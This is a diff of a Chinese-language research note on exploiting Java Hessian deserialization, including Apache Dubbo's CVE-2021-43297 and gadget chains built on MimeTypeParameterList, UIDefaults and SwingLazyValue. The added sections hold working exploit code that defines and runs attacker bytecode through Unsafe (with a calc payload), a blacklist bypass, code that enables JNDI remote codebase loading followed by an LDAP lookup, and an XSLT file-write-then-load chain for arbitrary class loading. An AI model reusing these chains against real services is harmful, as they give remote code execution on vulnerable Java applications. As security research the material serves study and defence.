@@ -1,5 +1,3 @@
-
-
 # 0x01 Apache Dubbo Hessian2 expection 2 deser
 
 参考：[Apache Dubbo Hessian2 异常处理时反序列化（CVE-2021-43297） (seebug.org)](https://paper.seebug.org/1814/)
@@ -23,12 +21,11 @@
 根据这个标记字节来决定反序列化的类型，67对应'C'，进入`readObjectDefinition` -> `readString`
 
 ```java
-    case 'C':
-      {
-        readObjectDefinition(null);
-
-        return readObject();
-      }
+case 'C':
+{
+    readObjectDefinition(null);
+    return readObject();
+}
 ```
 
 这里不止67可以用，只要最后让他匹配不到类型抛出expect即可
@@ -38,6 +35,8 @@
 `readString`又读了一次标记字节（`_buffer`头两个元素都是相同的标记字节）
 
 但这次没有找到对应67的case，进入default，抛出了`expect`异常
+
+`com.caucho.hessian.io.Hessian2Input#expect`
 
 ![image-20230621134047268](../.gitbook/assets/image-20230621134047268.png)
 
@@ -51,7 +50,7 @@
 
 接下来就是ROME利用链了
 
-`toStringBean#toString`->`getter` -> `JdbcRowSetImpl#getDatabaseMetaData` -> `InitialContext#lookup `
+`toStringBean#toString` -> `getter` -> `JdbcRowSetImpl#getDatabaseMetaData` -> `InitialContext#lookup `
 
 但若目标环境没有ROME依赖呢
 
@@ -59,7 +58,7 @@
 
 # 0x02 Different Path of XStream
 
-XStream有一条原生JDK的链子
+XStream有一条原生JDK的链子（为什么能联想到XStream是因为XStream和Hessian一样不需要类实现`Serializable`接口）
 
 ```xml
 javax.swing.MultiUIDefaults#toString
@@ -75,9 +74,13 @@ javax.swing.MultiUIDefaults#toString
 * `MultiUIDefaults`的访问修饰符是`default`，只有`javax.swing`才能使用它，Hessian反序列化时会出错
 * 高版本JDK打不了JNDI
 
-`Hessian`通过特定的反序列化器`Deserializer`反序列化，对类进行实例化，会先检查该类是否可访问`checkAccess`
+`MultiUIDefaults`实现了Map接口，获取到的反序列化器为`MapDeserializer`。
+
+其对类进行实例化，会先检查该类是否可访问`checkAccess`
 
 ![image-20230621143916701](../.gitbook/assets/image-20230621143916701.png)
+
+![image-20231022134130033](./../.gitbook/assets/image-20231022134130033.png)
 
 > Class com.caucho.hessian.io.MapDeserializer can not access a member of class javax.swing.MultiUIDefaults with modifiers "public"
 
@@ -86,21 +89,21 @@ javax.swing.MultiUIDefaults#toString
 大佬们找到了另一个可利用的`toString`类`javax.activation.MimeTypeParameterList`
 
 ```java
-    public String toString() {
-        StringBuffer buffer = new StringBuffer();
-        buffer.ensureCapacity(this.parameters.size() * 16);
-        Enumeration keys = this.parameters.keys();
+public String toString() {
+    StringBuffer buffer = new StringBuffer();
+    buffer.ensureCapacity(this.parameters.size() * 16);
+    Enumeration keys = this.parameters.keys();
 
-        while(keys.hasMoreElements()) {
-            String key = (String)keys.nextElement();
-            buffer.append("; ");
-            buffer.append(key);
-            buffer.append('=');
-            buffer.append(quote((String)this.parameters.get(key)));
-        }
-
-        return buffer.toString();
+    while(keys.hasMoreElements()) {
+        String key = (String)keys.nextElement();
+        buffer.append("; ");
+        buffer.append(key);
+        buffer.append('=');
+        buffer.append(quote((String)this.parameters.get(key)));
     }
+
+    return buffer.toString();
+}
 ```
 
 `parameters`成员是`Hashtable`类型，而`UIDefaults`也刚好继承了`Hashtable`
@@ -110,6 +113,8 @@ javax.swing.MultiUIDefaults#toString
 ![image-20230621150105158](../.gitbook/assets/image-20230621150105158.png)
 
 `createValue`能够调用类的静态方法或对类进行实例化
+
+（注意，这里用`Class.forName`加载类时，指定的类加载器是null，所以`SwingLazyValue`只能加载`rt.jar`下的类）
 
 `sun.reflect.misc.MethodUtil`的`invoke`静态方法可以任意调用方法
 
@@ -171,7 +176,7 @@ public class Test {
 }
 ```
 
-### Version Trap
+## Unsafe Bypass blacklist
 
 上面的POC打不出来，本地调试的Hessian版本是`4.0.63`
 
@@ -187,7 +192,49 @@ public class Test {
 
 试了一下降到`4.0.38`就可以了
 
-### JNDI Breakthrough
+当然既然能调用任意方法了，我们也不必拘束于`Runtime`
+
+利用`Unsafe`加载字节码，注意`Unsafe#defineClass`不会对类进行初始化，所以需要调用两次，在恶意类里添加一个静态方法，第二次调用之。
+
+```java
+public static byte[] getPayload() throws Exception {
+    ClassPool pool = ClassPool.getDefault();
+    CtClass clazz = pool.makeClass("a");
+    CtMethod staticInitializer = CtNewMethod.make("public static void exp() { Runtime.getRuntime().exec(\"calc\"); }", clazz);
+    clazz.addMethod(staticInitializer);
+    return clazz.toBytecode();
+}
+public static Object loadClass() throws Exception {
+    UIDefaults uiDefaults = new UIDefaults();
+
+    Class<?> clazz = Class.forName("sun.misc.Unsafe");
+    Field field = clazz.getDeclaredField("theUnsafe");
+    field.setAccessible(true);
+    Unsafe unsafe = (Unsafe) field.get(null);
+
+    Method defineClass = clazz.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
+    byte[] bytes = getPayload();
+    Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
+    SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{defineClass, unsafe, new Object[]{"a", bytes, 0, bytes.length, null, null}}});
+
+    uiDefaults.put("p4d0rn", slz);
+    MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
+    setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);
+    return mimeTypeParameterList;
+}
+
+public static Object initClass() throws Exception {
+    UIDefaults uiDefaults = new UIDefaults();
+
+    SwingLazyValue slz = new SwingLazyValue("a", "exp", new Object[0]);
+    uiDefaults.put("p4d0rn", slz);
+    MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
+    setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);
+    return mimeTypeParameterList;
+}
+```
+
+## JNDI Breakthrough
 
 高版本的JDK之所以有JNDI限制，是因为`trustURLCodebase`默认为`false`，禁用了RMI、CORBA和LDAP使用远程codebase的选项
 
@@ -210,6 +257,13 @@ public class Test {
 ```java
 Method setProperty = Class.forName("java.lang.System").getDeclaredMethod("setProperty", String.class, String.class);
 SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{setProperty, new Object(), new Object[]{"com.sun.jndi.ldap.object.trustURLCodebase", "true"}}});  
+```
+
+开启`trustURLCodebase`之后就可以发起JNDI请求了。
+
+```java
+Method doLookup = Class.forName("javax.naming.InitialContext").getDeclaredMethod("doLookup", String.class);
+SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{doLookup, new Object(), new Object[]{"ldap://127.0.0.1:8099/aaa"}}});
 ```
 
 # 0x03 PKCS9Attributes + BCEL
@@ -447,6 +501,55 @@ public class WriteFile {
     }
 }
 ```
+
+# XSLT Transform
+
+通过`com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename`静态方法写文件，然后通过`com.sun.org.apache.xalan.internal.xslt.Process#_main`去加载XSLT文件触发transform，达到任意字节码加载的目的。不需要出网。
+
+```xml
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:b64="http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder"
+                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
+                xmlns:th="http://xml.apache.org/xalan/java/java.lang.Thread"
+                xmlns:ru="http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils"
+                >
+    <xsl:template match="/">
+        <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'<base64_payload>')"/>
+        <xsl:variable name="cl" select="th:getContextClassLoader(th:currentThread())"/>
+        <xsl:variable name="rce" select="ru:defineClass('<class_name>',$bs,$cl)"/>
+        <xsl:value-of select="$rce"/>
+    </xsl:template>
+</xsl:stylesheet>
+```
+
+```java
+public static Object loadXslt() throws Exception {
+    UIDefaults uiDefaults = new UIDefaults();
+    SwingLazyValue slz = new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "file:///E:/Server/evil_xslt"}});
+    uiDefaults.put("p4d0rn", slz);
+    MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
+    setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);
+    return mimeTypeParameterList;
+}
+
+public static Object writeXslt() throws Exception {
+    String xsltTemplate = "";
+    byte[] bytes = ClassPool.getDefault().get("a").toBytecode();
+    String based = Base64.getEncoder().encodeToString(bytes);
+    String xslt = xsltTemplate.replace("<base64_payload>", based).replace("<class_name>", "a");
+    UIDefaults uiDefaults = new UIDefaults();
+    SwingLazyValue slz = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"E:/Server/evil_xslt", xslt.getBytes()});
+
+    uiDefaults.put("p4d0rn", slz);
+    MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
+    setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);
+    return mimeTypeParameterList;
+}
+```
+
+既然`org.springframework.cglib.core.ReflectUtils#defineClass`是静态方法，为什么不直接调用呢？
+
+试了一下`ClassLoader`在Hessian序列化时会出问题。。。
 
 # 0x05 Reference
 
